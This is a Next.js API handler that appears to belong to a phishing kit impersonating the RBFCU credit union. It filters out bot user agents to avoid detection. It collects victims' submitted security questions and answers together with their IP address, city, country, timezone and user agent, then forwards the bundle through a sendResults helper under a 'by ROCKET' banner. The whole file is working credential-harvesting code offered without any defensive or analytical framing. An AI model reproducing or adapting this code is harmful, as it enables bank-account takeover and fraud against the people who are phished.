import geoip from "geoip-lite";
import MobileDetect from "mobile-detect";
import nextConnect from "next-connect";
import { NextApiRequest, NextApiResponse } from "next";
import middleware from "../../middleware/middleware";
import { sendResults } from "../../utils/sendResults";

interface ExtendedRequest extends NextApiRequest {
  files: any;
}

const handler = nextConnect();
handler.use(middleware);

handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
  const md = new MobileDetect(req.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res.end(`Fuck off`);
    return;
  }

  try {
    const ip = req.headers[`x-forwarded-for`] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);

    const values = req.body;
    const listOrg = Object.keys(JSON.parse(values.answers[0]));
    listOrg.shift();
    const list = listOrg;
    const middleIndex = Math.ceil(list.length / 2);
    const data = JSON.parse(values.answers[0]);

    console.log(`list: `, list!.shift());

    const message = `
<div>------------------------------------</div>
${
  values.form[0] === `QUESTIONS` &&
  `

${list
  .splice(0, Math.ceil(listOrg.length / 2))
  .map((_, index) => {
    return `
<p>
(▰˘◡˘▰) ${index + 1}) ${JSON.parse(values.answers[0])[`quest${index + 1}`]}
</p>
 <p>a) <b>${JSON.parse(values.answers[0])[`ans${index + 1}`]}</b>
 </p>

`;
  })
  .toString()}

<div>
------------------------------------</div>
<p>(▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
<p>(▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
<p>(▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
<p>(▰˘◡˘▰) USER AGENT ☞ <b>${req.headers[`user-agent`]}</b></p>
<div>------------------------------------</div>`
}`;

    await sendResults(
      message,
      `RBFCU | ${values.form} by ROCKET 🚀 From ${String(ip).split(`,`)[0]}`
    );

    res.send(Promise.resolve());
  } catch (error) {
    res.status(500).send({
      name: `Something went wrong`,
    });
  }
});

export const config = {
  api: {
    bodyParser: false,
  },
};

export default handler;
